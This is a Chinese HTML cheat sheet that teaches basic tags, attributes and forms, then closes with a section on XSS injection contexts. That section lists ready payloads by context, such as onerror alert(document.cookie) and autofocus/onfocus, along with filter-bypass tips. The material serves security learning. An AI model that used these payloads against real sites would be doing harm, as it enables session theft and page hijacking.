# HTML 速查笔记

## 怎么用这份文件

1. 这份笔记把搭网页最常用的 HTML 从零讲起：先看下面的《索引 · 速查表》，一行一条，点「用法」列直接跳到正文对应位置；忘了哪条，按分类扫一遍就能找到。顺序照抄「一 文档结构 → 二 文本与容器 → 三 链接、图片与属性 → 四 列表与表格 → 五 表单 → 六 脚本、样式与嵌入 → 七 XSS 注入语境」，从头读一遍基本就够用了。
2. 正文每条固定三段：**解析**（白话讲清它是什么、什么时候用）、**操作**（能直接复制到 `.html` 文件里、用浏览器打开就能看到效果的示例）、`> ⚠️ 坑`（易错点，没有就不写）。
3. 标成 `html` 的示例都是完整可用的 HTML，需要自测时复制进一个 `.html` 文件、双击用浏览器打开即可。
4. 标题末尾带 **🔒** 的是和 Web 安全（XSS / 越权）相关的条目，解析里会点明它在攻防里怎么用——自学的重点之一。
5. 内容允许跨条目重复（同一个属性在不同标签下各写一遍）：你是「从索引直接跳进来查」的，重复比来回翻页省事，这是故意的。

---

## 索引 · 速查表

| 分类 | 用法（点击跳转） | 一句话作用 |
|------|------------------|-----------|
| 一 文档结构 | [`<!DOCTYPE html>`](#doctype-html-声明文档类型) | 声明这是 HTML5 文档 |
| 一 文档结构 | [`html`](#html-根元素) | 整份文档的根容器 |
| 一 文档结构 | [`head`](#head-文档头部) | 放标题、编码等给浏览器看的信息 |
| 一 文档结构 | [`body`](#body-可见内容) | 放页面上所有可见内容 |
| 二 文本与容器 | [`h1`~`h6`](#h1h6-标题) | 六级标题，用来搭大纲 |
| 二 文本与容器 | [`p`](#p-段落) | 一个段落 |
| 二 文本与容器 | [`br` 与 `hr`](#br-与-hr-换行与分割线) | 换行与水平分割线 |
| 二 文本与容器 | [`span`](#span-行内容器) | 行内小容器，给文字套壳 |
| 二 文本与容器 | [`div`](#div-块级容器) | 块级容器，做布局分区 |
| 三 链接、图片与属性 | [`a`](#a-超链接) | 超链接 |
| 三 链接、图片与属性 | [`img`](#img-图片) | 插入图片 |
| 三 链接、图片与属性 | [`href` 与 `src`](#属性-href-与-src-地址) | 跳转地址 / 资源地址 |
| 三 链接、图片与属性 | [`alt`](#属性-alt-替代文本) | 图片的替代文字 |
| 三 链接、图片与属性 | [`id` 与 `class`](#属性-id-与-class) | 唯一编号 / 可复用类名 |
| 三 链接、图片与属性 | [`onclick`](#属性-onclick-点击事件) 🔒 | 点击时执行的 JS |
| 四 列表与表格 | [`ul` 与 `ol`](#ul-与-ol-列表) | 无序 / 有序列表 |
| 四 列表与表格 | [`li`](#li-列表项) | 列表里的一项 |
| 四 列表与表格 | [`table`](#table-表格) | 数据表格 |
| 四 列表与表格 | [`tr`](#tr-表格行) | 表格的一行 |
| 四 列表与表格 | [`td` 与 `th`](#td-与-th-单元格) | 数据格 / 表头格 |
| 五 表单 | [`form`](#form-表单容器) | 表单外框，打包输入项 |
| 五 表单 | [`method`](#form-的-method-提交方式) | 数据用 get 还是 post 发 |
| 五 表单 | [`action`](#form-的-action-提交地址) 🔒 | 表单提交到哪个地址 |
| 五 表单 | [`input`](#input-输入控件) | 最常用的输入控件 |
| 五 表单 | [文本框与密码框](#input-文本框与密码框) | type=text / password |
| 五 表单 | [隐藏域](#input-隐藏域) 🔒 | type=hidden，看不见但也提交 |
| 五 表单 | [`button` 与提交按钮](#button-与-input-提交按钮) | 可点击按钮 / type=submit |
| 五 表单 | [`name` 与 `value`](#属性-name-与-value) | 表单字段的键名与值 |
| 五 表单 | [`placeholder`](#属性-placeholder-占位提示) | 输入框里的灰色提示 |
| 六 脚本、样式与嵌入 | [`script`](#script-脚本) 🔒 | 页面里的 JavaScript |
| 六 脚本、样式与嵌入 | [`style`](#style-页面样式) | 页面里的 CSS |
| 六 脚本、样式与嵌入 | [`iframe`](#iframe-内嵌框架) 🔒 | 内嵌另一个网页 |
| 六 脚本、样式与嵌入 | [HTML 注释](#html-注释) | `<!-- -->` 写说明，浏览器忽略 |
| 六 脚本、样式与嵌入 | [HTML 实体转义](#html-实体转义) 🔒 | `&lt;` `&gt;` `&amp;` 的写法 |
| 七 XSS 注入语境 | [XSS 注入语境](#xss-注入语境) 🔒 | 按输入落点选变形方式 |
| 七 XSS 注入语境 | [标签之间注入](#标签之间-注入) 🔒 | 直接写一个新标签 |
| 七 XSS 注入语境 | [属性值里注入](#属性值里-注入) 🔒 | 闭合引号再插属性 |
| 七 XSS 注入语境 | [`script` 内注入](#script-内注入) 🔒 | 闭合 script 或构造 JS |
| 七 XSS 注入语境 | [`img onerror` 注入](#img-onerror-注入) 🔒 | 加载失败即执行，免交互 |
| 七 XSS 注入语境 | [`onfocus` 注入](#onfocus-注入) 🔒 | 配合 autofocus 自动触发 |

---

## 一 文档结构

### `<!DOCTYPE html>` 声明文档类型

**解析**　写在 HTML 文件的最上面第一行，告诉浏览器「这是一份 HTML5 网页」。不写的话浏览器会进入「怪异模式」，某些样式和布局会跟你预期的不一样。一个页面只写一次。

**操作**

```html
<!DOCTYPE html>
<html>
  <head><title>我的网页</title></head>
  <body>你好</body>
</html>
```

> ⚠️ 坑　必须放在第一行，前面不能有空格、空行或注释，否则声明会被忽略。

### `html` 根元素

**解析**　整份文档最外层的容器，除 DOCTYPE 外所有内容都包在 `<html>...</html>` 里。用 `lang` 属性声明页面语言（中文写 `lang="zh-CN"`），方便浏览器和读屏软件处理。

**操作**

```html
<!DOCTYPE html>
<html lang="zh-CN">
  <head>...</head>
  <body>...</body>
</html>
```

> ⚠️ 坑　一个页面只有一个 `<html>` 根元素，别再往里套第二个。

### `head` 文档头部

**解析**　放「给浏览器看、不直接显示」的信息：网页标题 `<title>`、字符编码 `<meta charset>`、引用的 CSS 和 JS。用户看不到 `head` 里的内容（除了浏览器标签页上显示的标题）。

**操作**

```html
<head>
  <meta charset="UTF-8">          <!-- 用 UTF-8，中文才不会乱码 -->
  <title>我的第一个网页</title>
  <style>body { color: red; }</style>
</head>
```

> ⚠️ 坑　忘了写 `<meta charset="UTF-8">`，中文在有些浏览器里会变成一串乱码。

### `body` 可见内容

**解析**　页面上真正能看到的东西全放 `<body>` 里：文字、图片、按钮、表格。一个页面只有一个 `body`。

**操作**

```html
<body>
  <h1>欢迎</h1>
  <p>这是正文。</p>
</body>
```

> ⚠️ 坑　写在 `<head>` 里的正文文字不会显示，新手常把内容写错标签。

## 二 文本与容器

### `h1`~`h6` 标题

**解析**　`<h1>` 到 `<h6>` 是六级标题，`h1` 最大最重要、`h6` 最小。它们用来搭文章大纲，让浏览器和搜索引擎知道内容层级——不是为了「把字变大」，那件事归 CSS 管。

**操作**

```html
<h1>一级标题</h1>
<h2>二级标题</h2>
<h3>三级标题</h3>
<h6>六级标题</h6>
```

> ⚠️ 坑　一个页面一般只用一个 `<h1>`，标题等级不要跳级（别从 `h1` 直接跳到 `h4`）。

### `p` 段落

**解析**　一段文字。浏览器会自动在段落前后留出空白间距，这是它省心的地方。`<p>` 里不要再嵌一个 `<p>`，浏览器会强行拆开。

**操作**

```html
<p>这是第一段。</p>
<p>这是第二段。</p>
```

### `br` 与 `hr` 换行与分割线

**解析**　`<br>` 在当前位置强制换行（像 Shift+Enter，但仍在同一段里）；`<hr>` 画一条水平分割线，用来隔开两块内容。两个都是「空元素」，没有结束标签。

**操作**

```html
<p>第一行<br>第二行</p>
<hr>
<p>分割线下面的内容</p>
```

> ⚠️ 坑　不要用一堆 `<br>` 代替段落间距，段间距是 `<p>` 的活；`<br>` 只用来在段内换行。

### `span` 行内容器

**解析**　一个「行内」盒子，用来给一小段文字套个壳，方便加样式或让 JS 定位它。它自己不换行、不占整行，宽度只跟着内容走。

**操作**

```html
<p>价格：<span style="color:red">￥99</span> 元</p>
```

> ⚠️ 坑　`span` 是行内元素，给它设 `width`/`height` 通常不生效——要撑整行请用 `div`。

### `div` 块级容器

**解析**　一个「块级」盒子，独占一整行，用来把一堆元素框成一块做布局。`<div>` 本身没有任何视觉效果，纯粹是分区，样式靠 CSS 加。

**操作**

```html
<div id="header">
  <h1>网站标题</h1>
</div>
<div id="main">
  <p>正文</p>
</div>
```

> ⚠️ 坑　别把 `span`（行内）和 `div`（块级）用反；不确定时先想「这一块要不要独占一行」。

## 三 链接、图片与属性

### `a` 超链接

**解析**　点击跳到另一个网址或页面、跳到本页某处、或触发下载。`href` 写目标地址：写完整网址是外链，写 `#id` 是跳到本页某元素。

**操作**

```html
<a href="https://example.com">去 example</a>
<a href="#top">回到顶部</a>
<a href="https://example.com" target="_blank">新标签页打开</a>
```

> ⚠️ 坑　`href` 写 `javascript:alert(1)` 会执行 JS，这是 XSS 的一种入口（见「标签之间注入」）。

### `img` 图片

**解析**　插入一张图片。`src` 是图片地址（本地文件或网址都行），`alt` 是图片加载失败时显示的替代文字。图片按原始大小显示，可用 `width`/`height` 缩放。

**操作**

```html
<img src="cat.jpg" alt="一只橘猫" width="200">
<img src="https://example.com/a.png" alt="示例图">
```

> ⚠️ 坑　`img` 是空元素，写作 `<img>`，没有 `</img>`。

### 属性 `href` 与 `src` 地址

**解析**　`href` 给 `<a>`（以及 `<link>`）指定跳转或关联的目标地址；`src` 给 `<img>`、`<script>`、`<iframe>` 指定要加载的资源地址。一个是「带我去哪」，一个是「把什么装进来」。

**操作**

```html
<a href="/login">登录</a>
<img src="/static/logo.png" alt="logo">
<script src="/js/app.js"></script>
```

> ⚠️ 坑　`href` 常被攻击者改成 `javascript:` 伪协议来执行脚本；`src` 可控时则可能变成数据外发的出口。

### 属性 `alt` 替代文本

**解析**　图片显示不出来时替代它的文字，同时供读屏软件朗读。给每张有意义的图加 `alt` 是基本习惯，也方便搜索引擎理解图片。

**操作**

```html
<img src="broken.jpg" alt="加载失败时你会看到这行字">
```

> ⚠️ 坑　纯装饰性的图片写 `alt=""`（空值），表示「无需朗读」，不要漏写 `alt`。

### 属性 `id` 与 `class`

**解析**　`id` 是元素的唯一编号，同一页面里不能重复；`class` 是可复用的一组标签名，多个元素可以同名。CSS 用 `#id` 选、用 `.class` 选，JS 用 `document.getElementById()` 按 `id` 找。

**操作**

```html
<div id="login" class="panel box">...</div>
<div class="panel">...</div>
<style>
  #login { width: 300px; }
  .panel { border: 1px solid #ccc; }
</style>
```

> ⚠️ 坑　`id` 重复时 `getElementById` 只会拿到第一个，前端逻辑 bug 常常出在这。

### 属性 `onclick` 点击事件🔒

**解析**　元素被点击时执行的 JavaScript，写法是 `onclick="要执行的代码"`。方便的地方是把 JS 直接写在属性里；危险的地方也在这——一旦攻击者能控制这段属性值，就能注入脚本。

**操作**

```html
<button onclick="alert('你点了按钮')">点我</button>
```

> ⚠️ 安全　`onclick="alert(1)"` 是最经典的 XSS 验证；可控的 `onclick` 属性值本身就是注入点（见「属性值里注入」）。

## 四 列表与表格

### `ul` 与 `ol` 列表

**解析**　`<ul>` 是无序列表（每项前是圆点），`<ol>` 是有序列表（每项前是 1. 2. 3.）。列表里每个条目都要用 `<li>` 包起来。

**操作**

```html
<ul>
  <li>苹果</li>
  <li>香蕉</li>
</ul>
<ol>
  <li>第一步</li>
  <li>第二步</li>
</ol>
```

> ⚠️ 坑　直接往 `<ul>` 里塞文字而不放 `<li>`，浏览器会自行修正结构但很乱，别这么写。

### `li` 列表项

**解析**　列表里的一项，必须放在 `<ul>` 或 `<ol>` 里。`<li>` 内部还能再放一个子列表，做成多级列表。

**操作**

```html
<ul>
  <li>水果
    <ul><li>苹果</li></ul>
  </li>
  <li>蔬菜</li>
</ul>
```

### `table` 表格

**解析**　数据表格的外框，由行 `<tr>` 和单元格 `<td>` 组成。不要拿表格做网页整体布局（早就过时了），但展示二维数据仍然常用。

**操作**

```html
<table border="1">
  <tr><th>姓名</th><th>年龄</th></tr>
  <tr><td>小明</td><td>18</td></tr>
</table>
```

> ⚠️ 坑　`border="1"` 只是为了能看见框线，正式样式应该交给 CSS。

### `tr` 表格行

**解析**　表格的一行，里面装若干 `<td>`（数据格）或 `<th>`（表头格）。行与行从上到下排列。

**操作**

```html
<table>
  <tr><td>第一行第一列</td><td>第一行第二列</td></tr>
  <tr><td>第二行第一列</td><td>第二行第二列</td></tr>
</table>
```

### `td` 与 `th` 单元格

**解析**　`<td>` 是普通数据单元格，`<th>` 是表头单元格（默认加粗居中）。两者都必须放在 `<tr>` 里。

**操作**

```html
<table border="1">
  <tr><th>商品</th><th>价格</th></tr>
  <tr><td>键盘</td><td>199</td></tr>
</table>
```

> ⚠️ 坑　用 `colspan` 合并列、`rowspan` 合并行，例如 `<td colspan="2">合计</td>`。

## 五 表单

### `form` 表单容器

**解析**　把一组输入控件打包，用来把用户填的数据发给服务器。`input`、`button` 都放在它里面。服务器收到的是字段名和值组成的键值对。

**操作**

```html
<form method="post" action="/login">
  <input type="text" name="user">
  <input type="password" name="pass">
  <button type="submit">登录</button>
</form>
```

> ⚠️ 坑　提交一份空表单也算一次真实请求，后端必须把每个字段重新校验一遍。

### `form` 的 `method` 提交方式

**解析**　决定数据怎么发给服务器。`get` 把参数拼在 URL 后面（`?q=xxx`），`post` 把数据放在请求体里。查询类操作用 `get`，提交密码、修改数据用 `post`。

**操作**

```html
<form method="get" action="/search">
  <input type="text" name="q">
  <button type="submit">搜索</button>
</form>
<!-- 提交后地址栏变成 /search?q=你输入的内容 -->
```

> ⚠️ 坑　`get` 的参数会留在浏览器历史、服务器日志里，绝不要用它传密码。

### `form` 的 `action` 提交地址🔒

**解析**　表单数据发往哪个 URL。留空则发回当前页面。它和 `method` 一起决定「用哪种方式、发到哪里」。

**操作**

```html
<form method="post" action="/api/login">...</form>
```

> ⚠️ 安全　`action` 指向哪、后端有没有校验、有没有 CSRF Token，是测登录和越权时最先看的信息。

### `input` 输入控件

**解析**　最常用的输入控件。靠 `type` 属性决定它是文本框、密码框还是按钮；`name` 决定它提交给服务器时叫什么；`value` 是它当前的值。

**操作**

```html
<input type="text" name="username" value="默认值">
```

> ⚠️ 坑　`value` 里放用户输入时一定要转义，否则引号可以被闭合、往属性里注入代码（见「属性值里注入」）。

### `input` 文本框与密码框

**解析**　`type="text"` 显示明文，适合用户名、搜索词等；`type="password"` 输入时显示成圆点（`••••`），适合密码。注意它只是「看不见」，并不负责加密。

**操作**

```html
<input type="text" name="user" placeholder="用户名">
<input type="password" name="pass">
```

> ⚠️ 坑　`password` 遮的只是屏幕，传输安全要靠 HTTPS，别在 http 页面上提交密码。

### `input` 隐藏域🔒

**解析**　`type="hidden"` 的输入框不在页面上显示，但会随表单一起提交。常用来携带 token、用户 id 等前端看不见的字段。

**操作**

```html
<input type="hidden" name="user_id" value="1024">
```

> ⚠️ 安全　「对用户隐藏」不等于「对攻击者隐藏」：值能随手改，绝不能拿它做权限判断——越权漏洞常见的起因就是这里。

### `button` 与 `input` 提交按钮

**解析**　`<button>` 是可点击按钮；提交表单也可以写成 `<input type="submit" value="按钮文字">`。`button` 的 `type` 有 `submit`（默认，提交表单）、`button`（普通按钮，常配 `onclick`）、`reset`（清空表单）。

**操作**

```html
<button type="submit">提交</button>
<button type="button" onclick="alert('hi')">点我</button>
<input type="submit" value="保存">
```

> ⚠️ 坑　`button` 在表单里默认就是 `submit`，想让它只当普通按钮必须写 `type="button"`，否则会意外提交表单。

### 属性 `name` 与 `value`

**解析**　`name` 是表单字段提交给服务器时的「键名」，`value` 是它的「值」。服务器收到的是 `name=value` 这样的键值对。

**操作**

```html
<input type="text" name="city" value="北京">
<!-- 提交后服务器收到 city=北京 -->
```

> ⚠️ 坑　没有 `name` 的 `input` 不会被提交，这是新手最常踩的坑。

### 属性 `placeholder` 占位提示

**解析**　输入框里的灰色提示文字，告诉用户该填什么。一旦开始输入它就会消失，也不会真的作为值提交。

**操作**

```html
<input type="text" name="email" placeholder="请输入邮箱">
```

> ⚠️ 坑　`placeholder` 既不是标签也不是默认值，别拿它当字段说明或做校验。

## 六 脚本、样式与嵌入

### `script` 脚本🔒

**解析**　在页面里写或引入 JavaScript。直接写在标签之间用于小脚本，用 `src` 引入外部 `.js` 文件。浏览器读到就会执行。

**操作**

```html
<script>console.log("页面加载了");</script>
<script src="/js/app.js"></script>
```

> ⚠️ 安全　`<script>` 里的内容会被浏览器当代码执行，所以「用户输入被直接放进 script 标签」是最高危的 XSS（见「`script` 内注入」）。

### `style` 页面样式

**解析**　在页面里写 CSS，控制颜色、大小、布局。内容不会显示出来，只被浏览器解析成样式规则。

**操作**

```html
<style>
  p { color: #333; font-size: 16px; }
  .red { color: red; }
</style>
<p class="red">这段是红的</p>
```

### `iframe` 内嵌框架🔒

**解析**　在当前页面里嵌入另一个网页，`src` 写被嵌入页面的地址。常用于嵌广告、视频播放器、第三方登录框。

**操作**

```html
<iframe src="https://example.com" width="400" height="200"></iframe>
```

> ⚠️ 安全　`iframe` 是 XSS 和点击劫持（透明层盖住真按钮骗点击）的常见载体，`src` 可控时还能被用来钓鱼或跳转。

### HTML 注释

**解析**　用 `<!-- ... -->` 包起来的文字会被浏览器完全忽略，用来写给自己或同事看的说明。注意注释在「查看源代码」里一览无余，别往里放敏感信息。

**操作**

```html
<!-- 下面是导航栏 -->
<nav>首页 | 关于</nav>
```

> ⚠️ 坑　注释不能嵌套注释；内容里出现连续的 `--` 可能提前结束注释。

### HTML 实体转义🔒

**解析**　有些字符在 HTML 里另有含义，想显示它们本身得写成「实体」：`&lt;` 显示 `<`，`&gt;` 显示 `>`，`&amp;` 显示 `&`，`&quot;` 显示 `"`。这一层转义是防 XSS 的第一道拦网。

**操作**

```html
<p>算术里 1 &lt; 2 且 3 &gt; 2。</p>
<p>AT&amp;T 公司</p>
<!-- 浏览器显示：算术里 1 < 2 且 3 > 2。  /  AT&T 公司 -->
```

> ⚠️ 安全　把用户输入里的 `<` `>` `&` `"` `'` 转义后再输出，能挡住大部分「闭合标签 / 闭合属性」型 XSS；漏掉引号转义就对应「属性值里注入」。

## 七 XSS 注入语境

### XSS 注入语境🔒

**解析**　XSS（跨站脚本）就是把攻击者的 JavaScript 塞进页面、在别人的浏览器里执行。同一段意图放进不同的「语境」，要写成不同的样子才能生效。判定方法只有一句：**你的输入落在 HTML 的哪个位置，就按那个位置的语法去「逃出」它**。

**操作**

```text
输入落点            变形思路
标签之间         →  直接写一个新标签（<script>…）
属性值里         →  先闭合引号，再补一个新属性/事件
<script> 内     →  闭合 </script> 或直接构造合法 JS
```

> ⚠️ 坑　变形的核心永远是「先闭合包住你的那层语法，再注入自己的」；下面五条按语境拆开写。

### `标签之间` 注入🔒

**解析**　当你的输入被放在两个标签之间（如 `<div>你在这里</div>`），可以直接写一个新标签。经典 payload 是 `<script>alert(1)</script>`；很多网站会过滤 `script`，于是改用 `<img src=x onerror=alert(1)>`。

**操作**

```html
<div>用户输入：<script>alert(1)</script></div>
<!-- 被过滤 script 时改用不依赖 script 标签的写法： -->
<div><img src=x onerror=alert(1)></div>
```

### `属性值里` 注入🔒

**解析**　输入落在属性值里（如 `<input value="你在这里">`），要先用引号闭合属性，再补一个新属性——最常用的是事件属性（`onmouseover`、`onfocus`、`onerror`）。属性用双引号就用双引号闭合。

**操作**

```html
原始：<input value="INPUT">
payload："><img src=x onerror=alert(1)>
结果：  <input value=""><img src=x onerror=alert(1)>">
<!-- 属性用单引号时：INPUT 位置填  ' onmouseover='alert(1) -->
```

> ⚠️ 坑　外包引号是双引号还是单引号，决定你用哪个符号闭合，payload 要跟着变。

### `script` 内注入🔒

**解析**　输入落在 `<script>` 标签内部（如 `<script>var a = "你在这里";</script>`）。不能直接再写 `<script>`，要么先用 `</script>` 提前结束、再插新标签，要么直接构造能在 JS 里跑起来的代码。

**操作**

```html
<!-- 闭合现有字符串，把后面的代码注释掉 -->
<script>var name = "hello";alert(1);//";</script>

<!-- 或用 </script> 提前结束标签，再接一个全新标签 -->
<script>var name = "</script><img src=x onerror=alert(1)>";</script>
```

> ⚠️ 坑　`</script>` 在 HTML 里就是结束标记，浏览器解析时优先按标签处理，所以它常常「逃出」脚本字符串。

### `img onerror` 注入🔒

**解析**　`<img>` 没有结束标签，加载失败时会触发 `onerror`。让 `src` 指向一张不存在的图片，`onerror` 里的代码就会自动执行——不需要用户点任何东西，所以这是最通用的 XSS payload。

**操作**

```html
<img src=x onerror="alert(1)">
<img src=x onerror=alert(document.cookie)>
```

> ⚠️ 安全　`onerror` 免交互、`img` 又几乎不在白名单过滤范围内，是绕过滤的首选；`alert(document.cookie)` 用来验证能否读到 cookie。

### `onfocus` 注入🔒

**解析**　`onfocus` 在元素获得焦点（被选中、点入）时触发。给它配上 `autofocus`，元素一加载就自动获得焦点，于是无需用户操作就执行——常用来绕过「必须有一次交互」的限制。

**操作**

```html
<input autofocus onfocus=alert(1)>
<a href=# onfocus=alert(1) autofocus tabindex=1>点这</a>
```

> ⚠️ 安全　`autofocus` + `onfocus` 是免交互触发的一种，和 `onerror` 一起属于最常用的两类「自动执行」payload。
